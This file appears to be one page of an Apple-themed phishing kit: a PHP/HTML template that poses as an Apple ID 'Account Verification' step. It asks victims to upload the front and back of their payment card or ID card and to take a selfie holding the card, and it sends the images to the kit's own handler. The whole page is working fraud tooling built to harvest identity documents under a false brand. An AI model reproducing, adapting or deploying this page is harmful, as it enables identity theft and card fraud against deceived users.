
<?php
if(empty($_GET['type']))
{

    $core->redirect('?page=m.photo&type=id&appIdKey='.$appidkey.'&locale='.$localex);
    exit;
}
?>
<!DOCTYPE html>
<html>
  <head>
   
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>
   
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                <!DOCTYPE html>
<html lang="en"><head>
<title><?=$core->translate('Confirm your information',$lang);?></title><style>

.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    border-width: 1px;
    border-color: #0088cc;
       -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(./HijaIyh_App/assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(./HijaIyh_App/assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(./HijaIyh_App/assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}
.button-save {
    font-size: 15px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border: 1px solid #07c;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding: 4px 15px;
    text-align: center;
    white-space: nowrap;
}

.button-save.disabled, .button-save:disabled {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border-color: #07c;
    color: #fff;
    cursor: default;
    opacity: .3;
}
.error{
  background-color: #fefdd2;
  
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    outline: none;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(./HijaIyh_App/assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(./HijaIyh_App/assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(./HijaIyh_App/assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 400px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}


</style>


<script>
        function readURLmobile(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
                $('#gambarmobile')
                    .attr('src', e.target.result)
                    .width(300)
                    .height(150);
            };

            reader.readAsDataURL(input.files[0]);
        }
    }
    </script>
    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="head" style="height:130px;"><br><div style="font-size: 28px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;">

         <b><center><?=$core->translate('Account Verification',$lang);?></center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'><?=$core->translate('Your Apple ID is',$lang);?> <?=$core->session('appleid');?></font></b> 
            </div>
       </div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    
    position: relative;
    margin-top: 9px;
    margin-left: 15px;
    height: 530px;
  ">
  <?php
  if(@$_GET['type'] == 'card'){ ?>

<form action="?req=photo&type=card&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" method="POST" enctype="multipart/form-data" >
            <hr style="top:502px;">
                        <br><br>
            <font class="xFont2" style="top:10px;left:20px;"><b><?=$core->translate('TAKE A SELFIE BY HOLDING CARD',$lang);?></b></font>
      <font class="xFont3" style="top:40px;left:20px;">
          <li><?=$core->translate('Cardholders name and ID card should match and be clearly visible.',$lang);?></li><li><?=$core->translate('Please upload front and back your card.',$lang);?></li><br>
            <img id="gambarmobile" width="310" height="150" src="./HijaIyh_App/assets/img/uploadcc.png">
            <br><br>
            <font class="xFont2"><b><?=$core->translate('FRONT CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadcc_front" type="file" required>
            <br><br>
            <font class="xFont2"><b><?=$core->translate('BACK CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadcc_back" type="file" required>
            </font>
      <font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>

<button class="button-save" type="submit" style="
    position: absolute;
    top: 540px;
    float:right;right:40px;width: 120px;">
<span>Continue</span>
</button>


        </form>
        <?php
      }elseif($_GET['type'] == 'id')
      {
        ?>
        <form action="?req=photo&type=id&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" method="POST" enctype="multipart/form-data" >
            <hr style="top:387px;">
                        <br><br>
            <font class="xFont2" style="top:10px;left:20px;"><b><?=$core->translate('TAKE A SELFIE WITH',$lang);?></b></font>
      <font class="xFont3" style="top:40px;left:20px;">
            <div class="image-upload">
            <img id="gambarmobile" width="310" height="150" src="./HijaIyh_App/assets/img/id.png">
            <br><br>
            <font class="xFont2"><b><?=$core->translate('FRONT CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadid_front" type="file" required>
            <br><br>
            <font class="xFont2"><b><?=$core->translate('BACK CARD',$lang);?></b></font><br><br>
            <input id="file-input2" name="uploadid_back" type="file" required>
            </font>
            </div>

            </font>
      <font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>

<button class="button-save" type="submit" style="
    position: absolute;
    top: 430px;
    float:right;right:40px;width: 120px;">
<span><?=$core->translate('Continue',$lang);?></span>
</button>


        </form>
        <?php
      }
      ?>
        </div>                
                                </div>
        </div>
      <body>
</html>
